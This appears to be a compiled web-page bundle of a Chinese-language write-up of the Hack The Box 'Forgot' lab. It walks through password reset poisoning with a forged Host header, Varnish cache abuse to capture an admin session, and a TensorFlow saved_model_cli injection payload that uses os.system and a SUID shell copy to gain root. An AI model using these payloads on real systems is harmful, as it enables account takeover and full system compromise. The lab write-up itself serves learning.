`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023964"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "wings3d"                                                                                                                   ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023965"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "xigax"                                                                                                                     ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023966"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "xj3d"                                                                                                                      ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023967"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "blogpinger"                                                                                                                ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000050631"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"200"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        260"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L    "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"517"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W      "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"5523"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'     "reset"                                                                                                                     ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000065584"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"200"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        252"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L    "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"498"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W      "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"5227"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'     "forgot"')])])]),i("button",{class:"collapse"})],-1),w=i("p",null,"技术框架",-1),L=i("ul",null,[i("li",null,[i("code",null,"werkzeug 2.1.2")]),i("li",null,[i("code",null,"python3.8.10")])],-1),W=i("p",null,"网站浏览，看源代码，看架构，看功能点。发现了注释",-1),T=i("figure",null,[i("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/20230306.png",alt:"20230306",loading:"lazy",decoding:"async"})],-1),P=i("h2",{id:"web探索-到拿到user-flag",tabindex:"-1"},[s("Web探索 到拿到user flag "),i("a",{class:"header-anchor",href:"#web探索-到拿到user-flag","aria-label":'Permalink to "Web探索 到拿到user flag"'},"​")],-1),A=i("h3",{id:"password-reset-poisoning",tabindex:"-1"},[s("Password reset poisoning "),i("a",{class:"header-anchor",href:"#password-reset-poisoning","aria-label":'Permalink to "Password reset poisoning"'},"​")],-1),x=i("p",null,"发送以下数据包（修改host地址）：",-1),D=i("div",{class:"language- vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"}),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[i("code",{"v-pre":""},[i("span",{class:"line"},[i("span",null,"GET /forgot?username=robert-dev-1450212 HTTP/1.1")]),s(`
`),i("span",{class:"line"},[i("span",null,"Host: 你的host地址")]),s(`
`),i("span",{class:"line"},[i("span",null,"Upgrade-Insecure-Requests: 1")]),s(`
`),i("span",{class:"line"},[i("span",null,"DNT: 1")]),s(`
`),i("span",{class:"line"},[i("span",null,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36")]),s(`
`),i("span",{class:"line"},[i("span",null,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/.png),*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")]),s(`
`),i("span",{class:"line"},[i("span",null,"Referer: http://10.10.11.188/forgot")]),s(`
`),i("span",{class:"line"},[i("span",null,"Accept-Encoding: gzip, deflate")]),s(`
`),i("span",{class:"line"},[i("span",null,"Accept-Language: zh-CN,zh;q=0.9")]),s(`
`),i("span",{class:"line"},[i("span",null,"sec-gpc: 1")]),s(`
`),i("span",{class:"line"},[i("span",null,"Connection: close")])])]),i("button",{class:"collapse"})],-1),S=i("p",null,"然后本地nc -lvp监听80",-1),z=i("h3",{id:"tickets-static-cache",tabindex:"-1"},[s("/tickets - static cache "),i("a",{class:"header-anchor",href:"#tickets-static-cache","aria-label":'Permalink to "/tickets - static cache"'},"​")],-1),$=i("figure",null,[i("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303061.png",alt:"20230306",loading:"lazy",decoding:"async"})],-1),R=i("p",null,"Varnish/6.2 是用于缓存一些静态资源的。并且历史也爆过存在缓存投毒的漏洞（cache poisoning） ，去查找被缓存的静态资源",-1),N=i("blockquote",null,[i("p",null,"There will be some kind of rule, typically matching on the URL, to define what is cached and what is not. I’ll do some tests to see if I can figure out more about that rule.")],-1),H=i("p",null,[s("查找 "),i("code",null,"cache-control"),s(" 的header，那么为什么要看这个呢？不妨问问Notion AI")],-1),G=i("p",null,"问AI关于cache-control的内容如下：",-1),I=i("p",null,[i("code",null,"Cache-Control"),s(" 是HTTP协议中的一个用于控制缓存的header。通过设置不同的值，可以控制浏览器或代理服务器是否缓存响应，以及缓存多长时间等。而 "),i("code",null,"Age"),s(" 是HTTP协议中的一个响应头部，用于表示缓存对象在代理服务器或网关中存储的时间。它的值以秒为单位。")],-1),O=i("p",null,[s("一番确定后发现Varnish会去匹配string "),i("code",null,"/static"),s(" 进行缓存")],-1),V=i("p",null,[s("然后在 "),i("code",null,"/static"),s(" 下创建缓存目录后，发现cookie的部分被用到了缓存技术栈中")],-1),q=i("figure",null,[i("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303062.png",alt:"20230306",loading:"lazy",decoding:"async"})],-1),M=i("figure",null,[i("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303063.png",alt:"20230306",loading:"lazy",decoding:"async"})],-1),U=i("p",null,[s("这个时候开个新的匿名模式浏览器，访问这个static下的资源，然后再访问 "),i("code",null,"/tickets"),s(" 是可以浏览到tickets页面的（但是并不应该浏览到）")],-1),K=i("h3",{id:"admin-tickets",tabindex:"-1"},[s("/admin_tickets "),i("a",{class:"header-anchor",href:"#admin-tickets","aria-label":'Permalink to "/admin_tickets"'},"​")],-1),Y=i("p",null,[i("strong",null,"发现有不能点的要看一下源代码"),s("，发现了链接："),i("a",{href:"http://10.10.11.188/admin_tickets",target:"_blank",rel:"noreferrer"},"http://10.10.11.188/admin_tickets")],-1),X=i("p",null,[s("点进去跳转 "),i("a",{href:"http://10.10.11.188/home?err=ACCESS_DENIED",target:"_blank",rel:"noreferrer"},[i("code",null,"http://10.10.11.188/home?err=ACCESS_DENIED")])],-1),j=i("h3",{id:"钓鱼-等待链接",tabindex:"-1"},[s("钓鱼：等待链接 "),i("a",{class:"header-anchor",href:"#钓鱼-等待链接","aria-label":'Permalink to "钓鱼：等待链接"'},"​")],-1),Z=i("p",null,"创建一个不存在的路径：",-1),J=i("ul",null,[i("li",null,[i("a",{href:"http://10.10.11.188/Admin_tickets/Static/Meow",target:"_blank",rel:"noreferrer"},[i("code",null,"http://10.10.11.188/Admin_tickets/Static/Meow")])])],-1),Q=i("p",null,"然后等管理员访问",-1),ii=i("p",null,"看见有session访问这个页面。（记得storage清session）",-1),si=i("p",null,"然后看到了页面的auth .这块真的好坑，网页会自动大写首字母。所以看密码的话，还是看raw response的好。",-1),ti=i("figure",null,[i("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303064.png",alt:"20230306",loading:"lazy",decoding:"async"})],-1),li=i("h2",{id:"esclation",tabindex:"-1"},[s("Esclation "),i("a",{class:"header-anchor",href:"#esclation","aria-label":'Permalink to "Esclation"'},"​")],-1),hi=i("p",null,[i("code",null,"sudo -l"),s(" 看下权限")],-1),ai=i("div",{class:"language- vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"}),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[i("code",{"v-pre":""},[i("span",{class:"line"},[i("span",null,"Matching Defaults entries for diego on forgot:")]),s(`
`),i("span",{class:"line"},[i("span",null,"    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin")]),s(`
`),i("span",{class:"line"},[i("span")]),s(`
`),i("span",{class:"line"},[i("span",null,"User diego may run the following commands on forgot:")]),s(`
`),i("span",{class:"line"},[i("span",null,"    (ALL) NOPASSWD: /opt/security/ml_security.py")]),s(`
`),i("span",{class:"line"},[i("span",null,"diego@forgot:~$")])])]),i("button",{class:"collapse"})],-1),ki=i("p",null,"看了下py代码",-1),ei=i("figure",null,[i("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303065.png",alt:"20230306",loading:"lazy",decoding:"async"})],-1),ni=i("p",null,[s("通过函数 "),i("code",null,"Xnew = getVec(data)"),s(" 分析网页特征，并且保存在 "),i("code",null,"Xnew"),s(" 这个变量里。然后再分别加载不同模型，用什么 "),i("code",null,"loaded_model"),s("函数")],-1),ri=i("p",null,[s("最后，根据特征数值计算，选择 "),i("code",null,"score"),s(" 大于0.5的，判断其为 不安全的：")],-1),pi=i("div",{class:"language-lua vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"lua"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[i("code",{"v-pre":""},[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"preprocess_input_exprs_arg_string"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(data[i],safe"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"False)")])])]),i("button",{class:"collapse"})],-1),di=i("p",null,[s("这里用到了机器学习的库 "),i("code",null,"tensorflow.python.tools.saved_model_cli")],-1),gi=i("p",null,[i("a",{href:"https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-2841408",target:"_blank",rel:"noreferrer"},"https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-2841408")],-1),oi=i("p",null,"看github上commits的变更，发现了该函数有修改，默认safe为True：",-1),Fi=i("figure",null,[i("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303066.png",alt:"20230306",loading:"lazy",decoding:"async"})],-1),Ei=i("p",null,[s("之前会直接执行 "),i("code",null,"expr")],-1),Ci=i("figure",null,[i("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303067.png",alt:"20230306",loading:"lazy",decoding:"async"})],-1),ci=i("p",null,"然后关于这里input的介绍：",-1),yi=i("figure",null,[i("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303068.png",alt:"20230306",loading:"lazy",decoding:"async"})],-1),ui=i("div",{class:"language-lua vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"lua"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[i("code",{"v-pre":""},[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"input_key, expr "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," input_raw."),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"split"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'='"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},", "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")])])]),i("button",{class:"collapse"})],-1),Bi=i("p",null,[s("构造一个类似与 "),i("code",null,"input_key=<python expression>"),s(" 基于此基础修改POC,并且要保证其内部的触发xss检测")],-1),_i=i("div",{class:"language-lua vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"lua"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[i("code",{"v-pre":""},[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"to"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Admin&link"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"=/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"test&txt"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"abc"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"exec"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"""import os'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\n"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'os.system("'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"touch "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"tmp"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"114514"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'")"""'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},");"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"#<script>"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"alert"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"</"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"script"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},">"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"&issue"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Getting "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"error"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," while"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," accessing search feature "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"in"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," enterprise platform.")])])]),i("button",{class:"collapse"})],-1),mi=i("figure",null,[i("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303069.png",alt:"20230306",loading:"lazy",decoding:"async"})],-1),bi=i("p",null,[s("同时服务端运行 "),i("code",null,"sudo /opt/security/ml_security.py 2>/dev/null")],-1),fi=i("p",null,"然后发现了文件夹下有我们的 114514 这个文件，",-1),vi=i("p",null,[s("接着获取权限：这里的 "),i("code",null,"4777"),s(" 下的 "),i("code",null,"4"),s(" 代表 "),i("code",null,"Set UID"),s(" （可执行文件执行时，拥有文件所有者的权限。）")],-1),wi=i("div",{class:"language- vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"}),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[i("code",{"v-pre":""},[i("span",{class:"line"},[i("span",null,'abc=exec("""import os\\nos.system("chmod 4')]),s(`
`),i("span",{class:"line"},[i("span",null,'.777 /tmp/114514")""");#<script>alert(1)<\/script>')])])]),i("button",{class:"collapse"})],-1),Li=i("p",null,"运行：",-1),Wi=i("div",{class:"language- vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"}),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[i("code",{"v-pre":""},[i("span",{class:"line"},[i("span",null,"diego@forgot:/tmp$ ./114514 -p")])])]),i("button",{class:"collapse"})],-1),Ti=i("p",null,"此时看id已经是root了",-1),Pi=i("h2",{id:"reference",tabindex:"-1"},[s("Reference "),i("a",{class:"header-anchor",href:"#reference","aria-label":'Permalink to "Reference"'},"​")],-1),Ai=i("ul",null,[i("li",null,[i("a",{href:"https://0xdf.gitlab.io/2023/03/04/htb-forgot.html",target:"_blank",rel:"noreferrer"},"https://0xdf.gitlab.io/2023/03/04/htb-forgot.html")])],-1),Ii={__name:"htbforgot",setup(xi,{expose:r}){const a=JSON.parse('{"title":"HTB:Forgot","description":"","frontmatter":{"title":"HTB:Forgot","date":"2023-03-09T16:38:55.000Z","tags":["HTB","学习笔记","刷题","靶场"],"published":true,"hideInList":false,"feature":null,"isTop":false},"headers":[{"level":2,"title":"Recon","slug":"recon","link":"#recon","children":[]},{"level":2,"title":"Web探索 到拿到user flag","slug":"web探索-到拿到user-flag","link":"#web探索-到拿到user-flag","children":[{"level":3,"title":"Password reset poisoning","slug":"password-reset-poisoning","link":"#password-reset-poisoning","children":[]},{"level":3,"title":"/tickets - static cache","slug":"tickets-static-cache","link":"#tickets-static-cache","children":[]},{"level":3,"title":"/admin_tickets","slug":"admin-tickets","link":"#admin-tickets","children":[]},{"level":3,"title":"钓鱼：等待链接","slug":"钓鱼-等待链接","link":"#钓鱼-等待链接","children":[]}]},{"level":2,"title":"Esclation","slug":"esclation","link":"#esclation","children":[]},{"level":2,"title":"Reference","slug":"reference","link":"#reference","children":[]}],"relativePath":"pages/posts/history/htbforgot.md","path":"/home/runner/work/1dayluo.github.io/1dayluo.github.io/pages/posts/history/htbforgot.md","lastUpdated":1714218709000}'),e=g(),k=a.frontmatter||{};return e.meta.frontmatter=Object.assign(e.meta.frontmatter||{},a.frontmatter||{}),n("pageData",a),n("valaxy:frontmatter",k),globalThis.$frontmatter=k,r({frontmatter:{title:"HTB:Forgot",date:"2023-03-09T16:38:55.000Z",tags:["HTB","学习笔记","刷题","靶场"],published:!0,hideInList:!1,feature:null,isTop:!1}}),(l,Si)=>{const p=d;return o(),F(p,{frontmatter:E(k)},{"main-content-md":t(()=>[C,c,y,u,B,_,m,b,f,v,w,L,W,T,P,A,x,D,S,z,$,R,N,H,G,I,O,V,q,M,U,K,Y,X,j,Z,J,Q,ii,si,ti,li,hi,ai,ki,ei,ni,ri,pi,di,gi,oi,Fi,Ei,Ci,ci,yi,ui,Bi,_i,mi,bi,fi,vi,wi,Li,Wi,Ti,Pi,Ai]),"main-header":t(()=>[h(l.$slots,"main-header")]),"main-header-after":t(()=>[h(l.$slots,"main-header-after")]),"main-nav":t(()=>[h(l.$slots,"main-nav")]),"main-content":t(()=>[h(l.$slots,"main-content")]),"main-content-after":t(()=>[h(l.$slots,"main-content-after")]),"main-nav-before":t(()=>[h(l.$slots,"main-nav-before")]),"main-nav-after":t(()=>[h(l.$slots,"main-nav-after")]),comment:t(()=>[h(l.$slots,"comment")]),footer:t(()=>[h(l.$slots,"footer")]),aside:t(()=>[h(l.$slots,"aside")]),"aside-custom":t(()=>[h(l.$slots,"aside-custom")]),default:t(()=>[h(l.$slots,"default")]),_:3},8,["frontmatter"])}}};export{Ii as default};
